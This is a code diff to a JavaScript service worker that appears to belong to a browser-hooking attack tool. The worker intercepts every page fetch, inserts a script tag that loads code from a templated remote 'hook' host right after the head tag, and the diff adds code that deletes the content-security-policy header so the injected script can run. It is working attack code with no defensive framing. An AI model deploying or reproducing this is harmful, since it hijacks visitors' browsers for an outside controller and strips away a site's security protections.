@@ -1,21 +1,16 @@
-/*
-const injection = `<script>
-window._injected = true;
-console.log("Injected");
-</script>`;
-*/
-
 const injection = '<script src="https://{{ hook_host }}:{{ hook_port_https }}/hook" type="text/javascript"></script>'
+const anchor = "<head>"
 
-/*
-console.log("ServiceWorker init");
-self.addEventListener('install', function(e) {
-  console.log('[ServiceWorker] Install');
-});
-self.addEventListener('activate', function(e) {
-  console.log('[ServiceWorker] Activate');
-});
-*/
+function inject(bodyText) {
+  var anchorPos = bodyText.indexOf(anchor)
+  if (anchorPos == -1) {
+    console.log(`Failed to find ${anchor}`);
+    return bodyText;
+  }
+  anchorPos += anchor.length;
+  const newBodyText = bodyText.substring(0, anchorPos) + injection + bodyText.substring(anchorPos);
+  return newBodyText;
+}
 
 self.addEventListener("fetch", (event) => {
   event.respondWith((async () => {
@@ -29,17 +24,18 @@ self.addEventListener("fetch", (event) => {
     }
 
     const body = await response.blob();
-    const bodyText = await body.text();
-
-    const anchor = "<head>"
-    var anchorPos = bodyText.indexOf(anchor)
-    if (anchorPos == -1) {
-      console.log(`Failed to find ${achor}`);
-      return response;
-    }
-    anchorPos += anchor.length;
-    const newBodyText = bodyText.substring(0, anchorPos) + injection + bodyText.substring(anchorPos);
-    return new Response(newBodyText, response);
+    const bodyText = await body.text(); 
+    const newBodyText = inject(bodyText);        
+    const newHeaders = new Headers(response.headers);
+    if (newHeaders.has("content-security-policy")) {
+      newHeaders.delete("content-security-policy");
+    }   
+    const newResponse = new Response(newBodyText, {
+      status: response.status,
+      statusText: response.statusText,
+      headers: newHeaders
+    });
+    return newResponse;
   })());
 });
 
